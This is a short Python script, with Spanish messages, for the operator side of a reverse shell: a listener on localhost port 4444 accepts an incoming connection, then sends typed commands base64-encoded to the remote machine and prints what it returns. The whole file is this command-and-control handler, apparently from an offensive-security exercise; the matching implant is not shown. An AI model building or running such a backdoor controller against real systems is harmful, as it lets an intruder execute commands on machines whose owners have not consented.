import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):

        listener = socket. socket(socket.AF_INET, socket. SOCK_STREAM)
        listener. setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener. listen()
        print("[+] Esperando por conexiones")
        self.connection, address = listener.accept()
        print("[+] Tenemos una conexion de" + str(address))


    def reliable_send(self,data):
        json_data = ""
        json_data = base64.b64encode(data.encode('utf-8'))
        self.connection.send(json_data)

    def reliable_recive(self):
        json_data = self.connection.recv(32768).decode('utf-8')
        json_data = base64.b64decode(json_data)   
        return json_data.decode('utf-8')

    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        return self.reliable_recive()

    def run (self):
        while True:
            try:
                command = input(">> ")
                result = self.ejecutar_remoto(command)
                print(result)
            except ValueError:
                continue


escuchar = Listener("localhost", 4444)
escuchar.run()